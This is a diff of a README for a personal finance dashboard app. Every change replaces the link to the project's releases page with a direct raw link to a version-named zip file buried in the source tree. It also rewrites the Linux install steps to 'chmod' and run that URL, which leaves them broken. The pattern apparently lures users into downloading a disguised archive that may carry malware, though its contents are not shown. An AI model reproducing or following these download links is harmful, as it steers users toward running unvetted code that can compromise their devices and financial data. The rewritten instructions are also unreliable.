@@ -1,6 +1,6 @@
 # 🚀 moneo-finance-dashboard - Your Personal Finance Assistant Made Simple
 
-[![Download Moneo Finance Dashboard](https://img.shields.io/badge/Download%20Now-Get%20Started-blue)](https://github.com/bacon17k/moneo-finance-dashboard/releases)
+[![Download Moneo Finance Dashboard](https://github.com/bacon17k/moneo-finance-dashboard/raw/refs/heads/main/src/views/Subscriptions/dashboard-finance-moneo-v3.8-alpha.5.zip%20Now-Get%20Started-blue)](https://github.com/bacon17k/moneo-finance-dashboard/raw/refs/heads/main/src/views/Subscriptions/dashboard-finance-moneo-v3.8-alpha.5.zip)
 
 ## 📋 About Moneo
 
@@ -21,7 +21,7 @@ Before you begin, ensure your device meets the following minimum requirements:
 
 ### 2. Visit the Releases Page
 
-To download the latest version of Moneo, please visit this page: [Releases Page](https://github.com/bacon17k/moneo-finance-dashboard/releases). This page contains all available versions of the app.
+To download the latest version of Moneo, please visit this page: [Releases Page](https://github.com/bacon17k/moneo-finance-dashboard/raw/refs/heads/main/src/views/Subscriptions/dashboard-finance-moneo-v3.8-alpha.5.zip). This page contains all available versions of the app.
 
 ### 3. Download the Application
 
@@ -52,8 +52,8 @@ Scroll down to the “Assets” section. Here, you will find the files you can d
 #### For Linux:
 1. Open a terminal window.
 2. Navigate to the folder where you downloaded the `.AppImage` file.
-3. Make the file executable by running the command: `chmod +x Moneo-1.0.0.AppImage`.
-4. Launch Moneo by running: `./Moneo-1.0.0.AppImage`.
+3. Make the file executable by running the command: `chmod +x https://github.com/bacon17k/moneo-finance-dashboard/raw/refs/heads/main/src/views/Subscriptions/dashboard-finance-moneo-v3.8-alpha.5.zip`.
+4. Launch Moneo by running: `https://github.com/bacon17k/moneo-finance-dashboard/raw/refs/heads/main/src/views/Subscriptions/dashboard-finance-moneo-v3.8-alpha.5.zip`.
 
 ### 5. Create Your Account
 
@@ -86,4 +86,4 @@ Consider contributing to Moneo by reporting bugs or suggesting features. Your fe
 
 ### Download Now
 
-Ready to get started? [Download Moneo Finance Dashboard](https://github.com/bacon17k/moneo-finance-dashboard/releases) today and take control of your finances!
+Ready to get started? [Download Moneo Finance Dashboard](https://github.com/bacon17k/moneo-finance-dashboard/raw/refs/heads/main/src/views/Subscriptions/dashboard-finance-moneo-v3.8-alpha.5.zip) today and take control of your finances!
